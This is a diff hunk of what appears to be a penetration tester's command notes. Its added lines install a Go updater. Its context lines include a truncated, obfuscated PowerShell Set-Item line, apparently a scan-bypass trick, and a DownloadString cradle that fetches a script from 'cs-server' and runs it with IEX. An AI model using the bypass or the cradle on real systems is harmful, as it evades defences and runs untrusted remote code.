@@ -4,8 +4,12 @@ sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE
 
 ####Powershell v2 downloadstring####
 (New-Object System.Net.WebClient).DownloadString("http://cs-server/file.ps1") | IEX
-
-
+=============================================================================================================
+#### Update Golang
+git clone https://github.com/udhos/update-golang
+cd update-golang
+sudo ./update-golang.sh
+=============================================================================================================
 ###install python2.7
 sudo apt-get update
 sudo apt-get install build-essential checkinstall
